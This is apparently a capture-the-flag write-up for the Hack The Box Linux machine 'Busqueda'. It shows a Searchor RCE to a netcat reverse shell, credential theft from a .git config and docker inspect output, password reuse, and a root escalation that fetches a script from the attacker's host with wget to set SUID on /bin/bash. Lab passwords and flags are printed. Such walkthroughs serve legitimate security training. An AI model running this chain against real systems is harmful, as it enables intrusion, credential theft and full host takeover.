# Busqueda
* **POINTS**: 20
* **USER RATING**: Easy
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.4

## 1. Recon
```bash
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.208
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-12 06:09 EDT
Nmap scan report for 10.10.11.208
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.04 seconds
```

## 2. TCP-80
We can add the VHOST in "/etc/hosts" ad visit the site.

![home](Images/home.png)

The site can be searched starting from an engine, but the most interesting thing is the footer of the page which gives us information about the technologies used to implement the site.

<p align="center">
  <img src="Images/engine.png" />
</p>

## 3. RCE
Googling an exploit for `Searchor 2.4.2` I found a [git repository](https://github.com/jonnyzar/POC-Searchor-2.4.2) where it explains how to perform an RCE.

<p align="center">
  <img src="Images/rce.png" />
</p>

Then I put the payload into a Burp intercepted request and got the shell and the user flag.

```bash
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.208 52422
/bin/sh: 0: can't access tty; job control turned off
$ ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 May 12 09:43 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
$ cat /home/svc/user.txt
802f3806bf98a2c5d84cb83cc754f8bc
```

## 4. User to ROOT
As you can see from the previous output, there is a *.git* folder, so let's try to understand what it contains.

```bash
$ ls -al .git
total 52
drwxr-xr-x 8 www-data www-data 4096 May 12 09:43 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 hooks
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1 14:35 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs
```

But among the files, the most interesting is *config* where, in addition to some credentials, there is a subdomain.

```bash
$ cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

By trying the password found (as a possible password reuse), we obtain very important information in terms of privilege escalation as we understand that there is a script that can be run with administrator permissions.

```bash
$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
$ sudo -S -l
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Trying to execute the command we get information about its use.

```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

We execute the command with the first action and get information about the containers that are present.

```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 49 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 49 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Then we run the command with the second action following the directions in the docker [documentation](https://docs.docker.com/engine/reference/commandline/inspect/) and find several passwords.

```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}

$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

But when we try the last action that can be associated with the command, we notice that nothing is done.

```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

At this point we can add the previously found subdomain to */etc/hosts*, visit the page and log in as `administrator:jI86kGUuj87guWr3RyF`

![full](Images/gitea.png)

Then we visit the repository containing the scripts.

<p align="center">
  <img src="Images/scripts.png" />
</p>

In particular, analyzing the script called *system-checkup.py* it denotes how, when calling the command **full-checkup** it tries to execute a bash script.

![full](Images/full.png)

So let's create a file named *full-checkup.sh* to add the SUID to */bin/bash*.

```bash
#! /bin/bash

chmod u+s /bin/bash
```

The following steps are as follows:

* upload the file we created;
* run the python script;
* run `bash -p` and get the flag.

```bash
$ wget http://10.10.XX.XX:80/full-checkup.sh
--2023-05-12 10:48:45--  http://10.10.XX.XX/full-checkup.sh
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/x-sh]
Saving to: ‘full-checkup.sh’

     0K                                                       100% 1.73M=0s

2023-05-12 10:48:45 (1.73 MB/s) - ‘full-checkup.sh’ saved [33/33]

$ ls
full-checkup.sh
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
$ bash -p
id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
whoami
root
cat /root/root.txt
65e964079c78e0199fc70e21c370a087
```